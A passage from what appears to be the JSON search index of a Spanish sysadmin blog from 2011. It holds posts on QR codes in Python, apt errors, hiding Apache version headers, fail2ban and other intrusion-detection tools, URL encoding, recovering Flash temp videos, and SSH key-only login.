Otra forma : bash $ mysql -uuser -p dbname < mysql.sql","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/27/importar-un-volcado-de-datos-en-mysql/","loc":"https://karpoke.ignaciocano.com/2011/03/27/importar-un-volcado-de-datos-en-mysql/"},{"title":"Creando y leyendo códigos QR desde Python","text":"Un código QR (Quick Response Barcode) permite almacenar información en un código de barras de dos dimensiones. Hay bastantes servicios en la web que nos permiten crear nuestros propios códigos, por ejemplo el de Google , que podemos emplear desde la línea de comandos: bash $ curl http://chart.apis.google.com/chart?chs=150x150&cht=qr&chld=H|0&chl=texto -o qr.png Un pequeño alias para tenerlo siempre a mano: bash $ alias qrurl='qrurl() { curl http://chart.apis.google.com/chart?chs=150x150&cht=qr&chld=H|0&chl=${@// /%20} -o qr.$(date +%Y%m%d%H%M%S).png; }; qrurl' $ qrurl una ranita iba caminando Esto creará un fichero con un nombre parecido a qr.20110325161706.png . Hay un paquete que nos permite hacer esto desde la línea de comandos, es qrencode : ```bash $ qrencode qrencode version 3.1.1 Copyright (C) 2006, 2007, 2008, 2009 Kentaro Fukuchi Usage: qrencode [OPTION]... [STRING] Encode input data in a QR Code and save as a PNG image. -h display this message. --help display the usage of long options. -o FILENAME write PNG image to FILENAME. If '-' is specified, the result will be output to standard output. If -S is given, structured symbols are written to FILENAME-01.png, FILENAME-02.png, ...; if specified, remove a trailing '.png' from FILENAME. -s NUMBER specify the size of dot (pixel). (default=3) -l {LMQH} specify error collectin level from L (lowest) to H (highest). (default=L) -v NUMBER specify the version of the symbol. (default=auto) -m NUMBER specify the width of margin. (default=4) -S make structured symbols. Version must be specified. -k assume that the input text contains kanji (shift-jis). -c encode lower-case alphabet characters in 8-bit mode. (default) -i ignore case distinctions and use only upper-case characters. -8 encode entire data in 8-bit mode. -k, -c and -i will be ignored. -V display the version number and copyrights of the qrencode. [STRING] input data. If it is not specified, data will be taken from standard input. ``` También hay aplicaciones para el móvil, como el Kaywa Reader, pero ahora vamos a ver cómo podemos crear y leer un código QR desde Python. pyqrcode pyqrcode es una extensión para poder codificar y decodificar códigos QR en Python. Para la codificación se ha basado en la librería libqrencode de Fukuchi Kentaro, y para la decodificación utiliza la librería de qrcode de Yusuke Yanbe. Para instalarlo se necesita: bash $ sudo aptitude install jcc openjdk-6-jdk openjdk-6-jre python-imaging python-setuptools python-dev En su página pone el Java de Sun, pero a mi también me ha ido bien con el OpenJDK. Una vez que nos hayamos descargado el código, toca compilarlo: bash $ tar xvzf pyqrcode-0.2.1.tar.gz $ cd pyqrcode-0.2.1 $ make Si tenemos una versión de Python superior a la 2.6, nos aparecerá el siguiente error: bash python -m jcc --jar qrcode/qrcode.jar --build /usr/bin/python: jcc is a package and cannot be directly executed make: *** [lib] Error 1 La solución pasa por cambiar -m jcc por -m jcc.__main__ en el Makefile . Quedaría así: ```bash GENERATE=python -m jcc --jar $(LIBFILE) GENERATE=python -m jcc. main --jar $(LIBFILE) ``` Ahora ya podemos instalarlo: bash $ sudo make install También podemos crear un binario a partir de la extensión: bash $ sudo make egg e instalarlo: python $ cd dist $ sudo easy_install qrcode-0.2.1-py2.6-linux-i686.egg Para comprobar que está correctamente instalado, podemos hacer la siguiente prueba: ```python $ ipython import qrcode ``` En Ubuntu Maverick Meerkat es posible que nos salga el siguiente error : ```python In [1]: import qrcode AttributeError Traceback (most recent call last) /home/karpoke/ in () /usr/local/lib/python2.6/dist-packages/qrcode-0.2.1-py2.6-linux-i686.egg/qrcode/ init .py in () 19 pass 20 ---> 21 _qrcode._setExceptionTypes(JavaError, InvalidArgsError) 22 23 VERSION = \"0.2.1\" AttributeError: 'module' object has no attribute '_setExceptionTypes' ``` Después de ver el código que da este error, una posible solución es comentar la línea del fichero qrcode/__init__.py que da el error. ```python _qrcode._setExceptionTypes(JavaError, InvalidArgsError) ``` Volvemos a generar el huevo y lo volvemos a instalar: bash $ sudo make egg $ sudo easy_install qrcode-0.2.1-py2.6-linux-i686.egg Este python egg se puede descargar desde el directorio público . Ya podemos hacer una prueba para crear un código QR: python import sys, qrcode e = qrcode.Encoder() image = e.encode('ando con la mirada fija en el cielo', version=3, mode=e.mode.BINARY, eclevel=e.eclevel.H) image.save('out.png') Para decodificar: python import sys, qrcode d = qrcode.Decoder() print d.result if d.decode(\"out.png\") else \"error\" En el terminal Para hacer aún más cómoda la decodificación desde el terminal, vamos a crear un alias, qrdecode : ```bash $1 filename alias qrdecode='fqrdecode() { python -c \"import qrcode;d=qrcode.Decoder();print d.result if d.decode('\\''$1'\\'') else '\\''Error'\\''\"; }; fqrdecode' ``` Para crear un QR desde la línea de comandos ya tenemos el paquete qrencode comentado anteriormente. bash $ qrencode \"texto a poner en el código qr\" -o out.png $ qrdecode out.png texto a poner en el código qr Usando la webcam La biblioteca libdecodeqr contiene un lector de códigos QR usando la webcam. Para utilizarlo, ejecutamos: bash $ libdecodeqr-webcam","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/27/creando-y-leyendo-codigos-qr-desde-python/","loc":"https://karpoke.ignaciocano.com/2011/03/27/creando-y-leyendo-codigos-qr-desde-python/"},{"title":"Solucionado el error \"E: Problem with MergeList\" al actualizar Debian","text":"Tras realizar una actualización rutinaria, aptitude update , me encuentro con el siguiente error: bash E: Encountered a section with no Package: header E: Problem with MergeList /var/lib/apt/lists/ftp.caliu.cat_debian_dists_testing_main_binary-i386_Packages E: No se pudieron analizar o abrir las listas de paquetes o el archivo de estado. E: No se pudo reconstruir el almacén de paquetes La solución para resolver el conflicto, que parece ser debido a una corrupción en las listas, pasa por borrarlas, y ya podremos actualizar normalmente: bash $ sudo rm -fr /var/lib/apt/lists/*","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/17/solucionado-el-error-e-problem-with-mergelist-al-actualizar-debian/","loc":"https://karpoke.ignaciocano.com/2011/03/17/solucionado-el-error-e-problem-with-mergelist-al-actualizar-debian/"},{"title":"inception","text":"Inception en C: bash $ git clone https://github.com/karthick18/inception.git","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/14/inception/","loc":"https://karpoke.ignaciocano.com/2011/03/14/inception/"},{"title":"Ocultando cabeceras","text":"Tras instalar Apache, tanto en las cabeceras de la página : bash $ curl -I localhost HTTP/1.1 200 OK Date: Sat, 12 Mar 2011 11:55:12 GMT Server: Apache/2.2.16 (Ubuntu) Last-Modified: Sat, 02 Jan 2010 00:00:23 GMT ETag: \"aa34-b1-47c232cbc0633\" Accept-Ranges: bytes Content-Length: 177 Vary: Accept-Encoding Content-Type: text/html como en las páginas de error: ```html <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> 404 Not Found Not Found The requested URL /terminus was not found on this server. Apache/2.2.16 (Ubuntu) Server at localhost Port 80 ``` se muestra la versión de Apache, y de PHP si también lo hemos instalado. Ocultar este tipo de información se conoce como seguridad por oscuridad, por lo que no es realmente seguridad, pero puede ayudar a evitar ataques automatizados. Modificaremos las directivas ServerTokens , que por defecto es OS , y ServerSignature , que por defecto es On . En el fichero /etc/apache2/cond.d/security modificamos: bash ServerTokens ProductOnly ServerSignature Off La directiva ServerTokens acepta varias opciones: bash ServerTokens Prod[uctOnly] Server sends (e.g.): Server: Apache ServerTokens Major Server sends (e.g.): Server: Apache/2 ServerTokens Minor Server sends (e.g.): Server: Apache/2.0 ServerTokens Min[imal] Server sends (e.g.): Server: Apache/2.0.41 ServerTokens OS Server sends (e.g.): Server: Apache/2.0.41 (Unix) ServerTokens Full (or not specified) Server sends (e.g.): Server: Apache/2.0.41 (Unix) PHP/4.2.2 MyMod/1.2 Esta directiva también controla la información que proporciona la directiva ServerSignature : bash Syntax: ServerSignature On|Off|EMail Para ocultar la cabecera que muestra si tenemos instalado PHP y su versión editamos el fichero /etc/php5/apache2/php.ini y mofidificamos la variable: php expose_php = Off Sin embargo, después de todo esto, las cabeceras siguen mostrando que es un Apache: bash $ curl -I localhost HTTP/1.1 200 OK Date: Sat, 12 Mar 2011 12:20:39 GMT Server: Apache Last-Modified: Sat, 02 Jan 2010 00:00:23 GMT ETag: \"aa34-b1-47c232cbc0633\" Accept-Ranges: bytes Content-Length: 177 Vary: Accept-Encoding Content-Type: text/html Una opción para evitar que aparezca es compilar Apache . En el archivo includes/ap_release.h , deberíamos cambiar: ```bash define AP_SERVER_BASEVENDOR \"Apache Software Foundation\" define AP_SERVER_BASEPROJECT \"Apache HTTP Server\" define AP_SERVER_BASEPRODUCT \"Apache\" ``` Actualizado el 14 de abril de 2012 Otras opciones para modificar la cabecera ServerTokens o evitar que aparezca, sin tener que compilar, son: » utilizar el módulo mod_security » utilizar Varnish","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/12/ocultando-cabeceras/","loc":"https://karpoke.ignaciocano.com/2011/03/12/ocultando-cabeceras/"},{"title":"ls sin ls","text":"En bash: bash $ for i in *; do echo $i; done Fuente: nfosolutions.com En C : ```c / * * Esempio che scansiona una cartella stampando a video i file in essa * contenuti. / include include include include int main(int argc, char argv[]) { DIR dir; struct dirent *drent; if(argc < 2) { fprintf(stderr, \"%s \\n\", argv[0]); return EXIT_FAILURE; } if((dir = opendir(argv[1])) == NULL) { fprintf(stderr, \"Errore opendir()\\n\"); return EXIT_FAILURE; } while((drent = readdir(dir)) != NULL) { fprintf(stdout, \"--> %s\\n\", drent->d_name); } if(closedir(dir) < 0) { fprintf(stderr, \"Errore closedir()\\n\"); return EXIT_FAILURE; } } ``` En Python: python import os def ls(d): if os.path.isdir(d): for f in os.listdir(d): print \"%s%s\" % (f, \"/\" if os.path.isdir(f) else \"\") En Python utilizando un generador que devuelve un resultado cada vez : python import subprocess def listdirx(dirname='.', cmd='ls'): proc = subprocess.Popen([cmd, dirname], stdout=subprocess.PIPE) filename = proc.stdout.readline() while filename != '': yield filename.rstrip('\\n') filename = proc.stdout.readline() proc.communicate() Una alternativa a listdir usando ctypes y opendir, readdir : ```python !/usr/bin/python \"\"\" An equivalent os.listdir but as a generator using ctypes \"\"\" from ctypes import CDLL, c_char_p, c_int, c_long, c_ushort, c_byte, c_char, Structure, POINTER from ctypes.util import find_library class c_dir(Structure): \"\"\"Opaque type for directory entries, corresponds to struct DIR\"\"\" pass class c_dirent(Structure): \"\"\"Directory entry\"\"\" # FIXME not sure these are the exactly correct types! fields = ( ('d_ino', c_long), # inode number ('d_off', c_long), # offset to the next dirent ('d_reclen', c_ushort), # length of this record ('d_type', c_byte), # type of file; not supported by all file system types ('d_name', c_char * 4096) # filename ) c_dirent_p = POINTER(c_dirent) c_lib = CDLL(find_library(\"c\")) opendir = c_lib.opendir opendir.argtypes = [c_char_p] opendir.restype = c_dir_p FIXME Should probably use readdir_r here readdir = c_lib.readdir readdir.argtypes = [c_dir_p] readdir.restype = c_dirent_p closedir = c_lib.closedir closedir.argtypes = [c_dir_p] closedir.restype = c_int def listdir(path): \"\"\" A generator to return the names of files in the directory passed in \"\"\" dir_p = opendir(\".\") try: while True: p = readdir(dir_p) if not p: break name = p.contents.d_name if name not in (\".\", \"..\"): yield name finally: closedir(dir_p) if name == \" main \": for name in listdir(\".\"): print name ```","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/03/12/ls-sin-ls/","loc":"https://karpoke.ignaciocano.com/2011/03/12/ls-sin-ls/"},{"title":"With great power comes great responsibility","text":"Cuando ejecutamos sudo por primera vez nos dice: ```bash We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. ``` Trust... my ass : Fuente: xkcd.com Fuente: leprosys.info Fuente: leprosys.info Fuente: genbeta.com","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/03/07/with-great-power-comes-great-responsibility/","loc":"https://karpoke.ignaciocano.com/2011/03/07/with-great-power-comes-great-responsibility/"},{"title":"Detectando intrusos en Ubuntu Maverick Meerkat","text":"Un artículo para tener en cuenta algunas de las acciones que podemos llevar a cabo para securizar Ubuntu Maverick Meerkat . Algunos programas para facilitar la tarea de controlar los intentos de acceso al sistema: ufw ufw es una forma sencilla de manejar un cortafuegos. Nada más instalarlo, lo habilitamos: bash $ sudo ufw enable Damos de alta los servicios&#94; 1 &#94; que queremos que estén disponibles: bash $ sudo ufw allow http $ sudo ufw allow https $ sudo ufw allow 1234 Si queremos deshacer alguna de estas acciones, por ejemplo, eliminar la regla para el puerto 1234: bash $ sudo ufw delete 1234 Comprobamos el estado: ```bash $ sudo ufw status Estado: activo Hasta AcciónDesde ----- ------------------------ 80 ALLOW Anywhere 443 ALLOW Anywhere 1234 ALLOW Anywhere ```` fail2ban fail2ban busca intentos de acceso por SSH fallidos en /var/log/auth.log y bloquea las IPs de forma temporal. Podemos poner que se permitan hasta 3 intentos y si se falla se banea la IP durante, por ejemplo, 10 minutos. En el archivo /etc/fail2ban/jail.conf , además de poder poner un correo electrónico al cual nos lleguen los avisos, está la configuración para cada servicio que queramos controlar. Por ejemplo: ```bash [ssh] enabled = true port = 1234 filter = sshd logpath = /var/log/auth.log maxretry = 3 [apache] enabled = true port = http,https filter = apache-auth logpath = /var/log/apache / error.log maxretry = 3 ``` En el fichero también vienen configuración para Apache, varios servidores de FTP, de correo y DNS. Para controlar el estado ejecutamos el cliente, por ejemplo: bash $ sudo fail2ban-client status Status |- Number of jail: 2 `- Jail list: apache, ssh bash $ sudo fail2ban-client status ssh Status for the jail: ssh |- filter | |- File list: /var/log/auth.log | |- Currently failed: 0 | `- Total failed: 3 `- action |- Currently banned: 0 | `- IP list: `- Total banned: 0 denyhosts denyhosts es parecido a fail2ban . Comprueba los intentos de acceso por SSH fallidos en /var/log/auth.log y añade las IPs al fichero /etc/hosts.deny . psad psad monitoriza los logs del iptables para detectar intentos de intrusión y tráfico sospechos. Se pueden configurar incontables parámetros en /etc/psad/psad.conf . Para comprobar el estado ejecutamos: ```bash $ sudo psad -S [+] psadwatchd (pid: 18853) %CPU: 0.0 %MEM: 0.0 Running since: Mon Mar 7 19:34:09 2011 [+] psad (pid: 18851) %CPU: 0.0 %MEM: 0.4 Running since: Mon Mar 7 19:34:09 2011 Command line arguments: [none specified] Alert email address(es): karpoke@localhost [+] Version: psad v2.1.5 [+] Top 50 signature matches: [NONE] [+] Top 25 attackers: [NONE] [+] Top 20 scanned ports: [NONE] [+] iptables log prefix counters: [NONE] Total packet counters: tcp: 0, udp: 0, icmp: 0 [+] IP Status Detail: [NONE] Total scan sources: 0 Total scan destinations: 0 [+] These results are available in: /var/log/psad/status.out ``` Tiger Tiger es una herramienta de detección de intrusiones. Para ejecutarlo (Ojo! el análisis es bastante intenso en términos de CPU): ```bash $ sudo tiger Configuring... Will try to check using config for 'i686' running Linux 2.6.32-28-generic... --CONFIG-- [con005c] Using configuration files for Linux 2.6.32-28-generic. Using configuration files for generic Linux 2. Tiger security scripts *** 3.2.2, 2007.08.28.00.00 *__ 20:38> Beginning security report for terminus. 20:38> Starting file systems scans in background... 20:38> Checking password files... 20:38> Checking group files... 20:38> Checking user accounts... 20:40> Checking .rhosts files... 20:40> Checking .netrc files... 20:40> Checking ttytab, securetty, and login configuration files... 20:40> Checking PATH settings... 20:40> Checking anonymous ftp setup... 20:40> Checking mail aliases... 20:40> Checking cron entries... 20:40> Checking 'inetd' configuration... 20:40> Checking 'tcpd' configuration... 20:40> Checking 'services' configuration... 20:40> Checking NFS export entries... 20:40> Checking permissions and ownership of system files... --CONFIG-- [con010c] Filesystem 'devtmpfs' used by 'none' is not recognised as a valid filesystem 20:40> Checking for indications of break-in... --CONFIG-- [con010c] Filesystem 'devtmpfs' used by 'none' is not recognised as a valid filesystem 20:40> Performing rootkit checks... 20:41> Performing system specific checks... 20:44> Performing root directory checks... 20:44> Checking for secure backup devices... 20:44> Checking for the presence of log files... 20:44> Checking for the setting of user's umask... 20:44> Checking for listening processes... 20:44> Checking SSHD's configuration... 20:44> Checking the printers control file... 20:44> Checking ftpusers configuration... 20:44> Checking NTP configuration... 20:44> Waiting for filesystems scans to complete... 20:44> Filesystems scans completed... 20:44> Performing check of embedded pathnames... 20:45> Security report completed for terminus. Security report is in `/var/log/tiger/security.report.terminus.110307-20:38'. ``` Para evitar el aviso : bash –CONFIG– [con010c] Filesystem 'devtmpfs' used by 'none' is not recognised as a valid filesystem editamos el fichero de configuración, /etc/tiger/tigerrc , y añadimos el sitema de ficheros devtmpfs como válido. Para esto buscamos la clave Tiger_FSScan_Local y la modificamos: bash Tiger_FSScan_Local='devtmpfs' logwatch logwatch analiza los logs del sistema y nos envía un repote de las áreas a analizar que le especifiquemos. Se ejecuta diariamente. Podemos configurar el correo al que envía los reportes dándole un valor a la variable de entorno MAILTO . Añadimos la siguiente línea al fichero /etc/bash.bashrc : bash MAILTO=user@localhost Para probar el funcionamiento ejecutamos: bash $ /usr/sbin/logwatch --debug 10 logcheck logcheck , otro analizador de logs . Es posible que empecemos a recibir demasiados mensajes debido a la sincronización de ntp , pero podemos configurarlo para que los ignore. El fichero de configuración está en /etc/logcheck/logcheck.conf . 1 Podemos encontrar una lista de los servicios más comunes en el fichero /etc/services . \"1\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/07/detectando-intrusos-en-ubuntu-maverick-meerkat/","loc":"https://karpoke.ignaciocano.com/2011/03/07/detectando-intrusos-en-ubuntu-maverick-meerkat/"},{"title":"Imágenes embebidas en el código HTML, CSS o JSON","text":"Mediante esquema data:URI se pueden incluir imágenes codificadas en base64 en el CSS de una página o en el src de una etiqueta img como si fueran fuentes externas. También se pueden introducir otro tipo de datos, como por ejemplo, código HTML. html <img src=\"data:image/png;base64,iVBORw0KGgo[...]QmCC\" title=\"image\" alt=\"image\" /> También se puede utilizar en un JSON : json { \"image\":{ \"data_uri\":\"data:image/png;base64,iVBORw0KGgo[...]QmCC\" } } Las ventajas de utilizar este método son que no se necesitan abrir conexiones adicionales para decargar los datos, ya que toda la información está incluida en el propio archivo, con lo que dejan recursos disponibles, algo que puede ser especialmente útil en redes inalámbricas muy saturadas o lentas, como algunas redes de telefonía móvil, y se crean menos entradas en la caché del navegador. Además, al estar incluidos en el código se pueden cachear. Entre los incovenientes, se necesita procesar la imagen para poder incluirla, los datos codificados en base 64 son hasta un 33% más grandes, si los datos se utilizan más de una vez en el mismo documento, deben ser incluidos cada vez, por lo que no se aprovecha la caché del navegador, la URL tiene un máximo relativamente pequeño y diferente para cada navegador y, por último, aunque los navegadores más populares lo soporten, no Codificar la imagen Para codificar una imagen podemos utilizar el comando base64 . El argumento -w0 es para que devuelva el resultado en una sola línea: bash $ base64 -w0 img.png > img.b64 Sin embargo, este formato no es apropiado para URL , ya que contiene caracteres como + , / o = , por lo que codificaremos la salida del comando anterior para que lo sea: bash $ alias urlenc='furlenc() { perl -MURI::Escape -e \"print uri_escape(\\\"$1\\\").\\\"\\n\\\";\"; }; furlenc' $ urlenc $(base64 -w0 img.png) > img.b64 Decodificar una imagen Para realizar el paso inverso, obtener la imagen a partir del código en la página, guardaremos en un fichero, por ejemplo img.b64 , el código en base64 referente a la imagen: bash alias urldec='furldec() { echo \"$1\" | sed -e'\\''s/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g'\\'' | xargs echo -e; }; furldec' $ urldec $(cat img.b64) | base64 -d > img.png \"urlencode y urldecode\"","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/03/06/imagenes-embebidas-en-el-codigo-html-css-o-json/","loc":"https://karpoke.ignaciocano.com/2011/03/06/imagenes-embebidas-en-el-codigo-html-css-o-json/"},{"title":"urlencode y urldecode","text":"Los siguientes caracteres son los únicos que se pueden utilizar en una URL: bash [a-zA-Z0-9-._~] El resto, se deben codificar usando el prefijo % seguido del valor ASCII hexadecimal del carácter. Por ejemplo: bash ( = %28 ) = %29 / = %2F + = %2B ... Para codificar la URL podemos utilizar la función uri_escape del módulo URI de Perl. bash alias urlenc='furlenc() { perl -MURI::Escape -e \"print uri_escape(\\\"$1\\\").\\\"\\n\\\";\"; }; furlenc' bash $ urlenc http://www.google.com http%3A%2F%2Fwww.google.com Para la decodificación de la URL , podemos hacer uso de sed : bash alias urldec='furldec() { echo \"$1\" | sed -e'\\''s/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g'\\'' | xargs echo -e; }; furldec' bash $ urldec http%3A%2F%2Fwww.google.com http://www.google.com \"rfc3986\"","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/03/06/urlencode-y-urldecode/","loc":"https://karpoke.ignaciocano.com/2011/03/06/urlencode-y-urldecode/"},{"title":"Recuperando los vídeos Flash borrados por el plugin de Adobe","text":"La nueva versión del plugin de Adobe borra los archivos termporales de vídeo justo después de abrirlos para evitar que tengamos la tentación de copiar el vídeo simplemente copiando el archivo /tmp/FlashXXXX . hons , un usuario de commandlinefu.com ha publicado un comando que crea un enlace simbólico al controlador del archivo con el nombre del archivo borrado: ```bash $ for h in $(find /proc/ /fd -ilname \"/tmp/Flash \" 2>/dev/null); do ln -s \" \\(h\" $(readlink \"\\) h\" | cut -d' ' -f1); done ``` Vamos a probarlo con un vídeo cualquiera, por ejemplo este: IT Crowd - Fire . Con find podemos encontrar estos archivos borrados: bash $ find /proc/_/fd -ilname \"/tmp/Flash_\" 2>/dev/null /proc/21204/fd/36 y con readlink podemos saber el nombre que tenían. bash $ readlink /proc/21204/fd/36 /tmp/FlashXX3Jmbxp (deleted) Tras ejecutar el comando, tendremos un enlace como el siguiente: bash $ ls -nl /tmp/Flash* lrwxrwxrwx 1 1000 1000 17 2011-03-04 17:42 FlashXX3Jmbxp -> /proc/21204/fd/36 Para copiarlo basta hacer: bash $ cp /tmp/FlashXX3Jmbxp ~/it-crowd-fire.flv Actualizado el 22 de marzo de 2012 Actualmente, parece que esto ya no funciona. Los vídeos ya no se guardan en en el directorio /tmp . Sin embargo, es posible que podamos encontrar el vídeo en la caché del navegador. En Firefox, la caché se encuentra en ~/.mozilla/firefox/userprofile/Cache , donde userprofile es algo como lwx2hgoq.default . Para encontrar los archivos que sean vídeos Flash, podemos ejecutar algo como esto para encontrarlos: bash $ find . -type f -exec file {} \\; | grep -i flash | grep -iv compressed | awk -F: '{print $1}' ./2/2F/929B0d01 ./E/B3/307B6d01 ./C/B5/E5137d01 ./3/86/C1069d01 ./D/7B/DFE3Dd01 ./F/42/414E2d01 Excluyo los archivos compressed porque no he podido abrirlos con ningún programa. Al intentarlo, devolvía un error de Compressed SWF format not supported . En Chromium la caché se guarda en ~/.cache/chromium/Cache . if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/03/04/recuperando-los-videos-flash-borrados-por-el-plugin-de-adobe/","loc":"https://karpoke.ignaciocano.com/2011/03/04/recuperando-los-videos-flash-borrados-por-el-plugin-de-adobe/"},{"title":"Conectarse por SSH sólo usando la clave","text":"Conectarnos a nuestro servidor de SSH utilizando una clave RSA en lugar de una contraseña es más seguro, dado que la clave RSA será bastante más larga y difícil de comprometer que nuestra contraseña, y más cómodo, dado que ya no tendremos que escribir la contraseña para iniciar sesión. Configuración En el equipo local, creamos la clave. Cuando nos pida contraseña, le asignamos una, que nos será requerida cada vez que queramos usar dicha clave. Si estuviéramos creando las claves en el servidor la dejaríamos en blanco . bash $ ssh-keygen -b 4096 -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/username/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/username/.ssh/id_rsa. Your public key has been saved in /home/username/.ssh/id_rsa.pub. The key fingerprint is: b5:51:c4:64:51:d6:d5:98:38:a6:0d:f1:ae:25:10:fb username@host The key's randomart image is: +--[ RSA 4096]----+ | ==*o+.| | =oO . .| | =.o* o | | . . oo | | . o S .. | | E o . . | | . . . | | . . | | | +-----------------+ La copiamos al servidor: ```bash $ ssh-copy-id username@remotehost username@remotehost's password: Now try logging into the machine, with \"ssh 'username@remotehost'\", and check in: .ssh/authorized_keys to make sure we haven't added extra keys that you weren't expecting. ``` Si tenemos SSH corriendo en un puerto distinto, deberemos incluirlo todo entre comillas simples, algo como: bash $ ssh-copy-id '-p1234 username@remotehost' Hacemos lo que nos sugiere, y nos conectamos al servidor para comprobar que en el fichero ~/.ssh/authorized_keys están únicamente las claves que hemos autorizado nosotros: bash $ ssh username@remotehost Fuente: openssh.com En el servidor, editamos el fichero /etc/ssh/sshd_config y nos aseguramos de que: bash PubkeyAuthentication yes PasswordAuthentication no AllowUsers username Reiniciamos el servicio ssh y listos: bash $ sudo service ssh restart Si nos intentamos conectar desde un ordenador el cual no contiene la clave, o con un usuario para el cual no está permitido el acceso: bash other@otherhost:~$ ssh user@remotehost Permission denied (publickey). Cambiar o eliminar la frase de paso de la clave privada Si habíamos introducido una contraseña para usar la clave al crearla y más tarde queremos cambiarla o eliminarla, por ejemplo, para conectarnos por ssh en un script : bash $ ssh-keygen -p -f ~/.ssh/id_rsa Enter old passphrase: Key has comment '/home/unsername/.ssh/id_rsa' Enter new passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved with the new passphrase. Si hemos dejado en blanco el campo para la nueva contraseña, ya no nos la pedirá al conectarnos. Permitir que otro usuario se conecte usando sólo la clave Para que nos podamos conectar al servidor de la misma manera pero desde otro equipo, deberemos seguir los mismos pasos descritos arriba, pero antes, deberemos volver a permitir la autenticación con contraseña, ya que de lo contrario el nuevo usuario no podrá copiar su clave al servidor. Nos conectamos al servidor con el usuario que con el que ya tenemos acceso y editamos el fichero /etc/ssh/sshd_config : bash PasswordAuthentication yes Si el nuevo usuario se conecta al servidor con un usuario distinto al de antes, deberemos añadirlo a la lista de usuarios permitidos: bash AllowUser username otherusername Reiniciamos el servicio: bash $ sudo service ssh restart En el nuevo equipo, seguimos los pasos descritos arriba para crear la clave y copiarla al servidor. bash $ ssh-keygen -b 4096 -t rsa Una vez copiada, podemos probar de conectarnos: bash $ ssh otherusername@remotehost $ ssh-copy-id otherusername@remotehost $ ssh otherusername@remotehost Si todo ha ido bien, y nos hemos conectado al servidor con el nuevo usuario, ya podemos deshabilitar la autenticación por contraseña, en el fichero /etc/ssh/sshd_config : bash PasswordAuthentication no Y volvemos a reiniciar el servicio: bash $ sudo service ssh restart","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/03/03/conectarse-por-ssh-solo-usando-la-clave/","loc":"https://karpoke.ignaciocano.com/2011/03/03/conectarse-por-ssh-solo-usando-la-clave/"},{"title":"Cabeceras HTTP personalizadas en Apache2","text":"Podemos modificar las cabeceras que devuelve el Apache usando el módulo mod_headers . Por ejemplo, añadiendo a nuestro virtualhost : ```bash Header set X-MyHeader \"It took %D microseconds to serve this page.\" ``` Se pueden modificar tanto las cabeceras que van a ser enviadas, con la directiva Header , como las que vienen con una petición, con la directiva RequestHeader . Las acciones que se pueden llevar a cabo son: set , especifica el valor de la cabecera, la crea si no existía o la modifica en caso contrario append , añade el valor al final de la cabecera existente, y separa los valores por comas add , añade una cabecera, duplicando la cabecera si ésta ya existía unset , elimina una cabecera echo , sólo en el caso de la directiva 